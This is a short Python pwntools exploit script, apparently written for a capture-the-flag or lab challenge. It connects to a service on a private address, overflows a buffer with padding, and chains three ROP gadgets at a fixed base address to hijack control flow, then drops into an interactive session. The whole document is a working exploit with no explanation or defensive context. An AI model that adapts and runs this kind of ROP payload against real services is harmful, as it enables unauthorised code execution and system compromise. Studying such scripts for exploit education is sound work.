from pwn import *

s = remote('192.168.0.85',1234)
gadget1 = 0x0001985d # push esp ; and al, 0x30 ; mov dword ptr [esp], edx ; call eax
gadget2 = 0x0001706b # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
gadget3 = 0x00095d4d # sub eax, edi ; pop esi ; pop edi ; ret
dat = ''
dat += 'A'*(0x1c)
dat += 'A'*4
dat += p32(0x5555e000+gadget2)
dat += p32(0x777b3137)
dat += 'AAAA'*2
dat += p32(0x22216267)
dat += 'AAAA'
dat += p32(0x5555e000+gadget3)
dat += 'AAAA'*2
dat += p32(0x55577532)
s.recvuntil('GO : ) \n')
raw_input()
s.send(dat+'\n')
s.interactive()
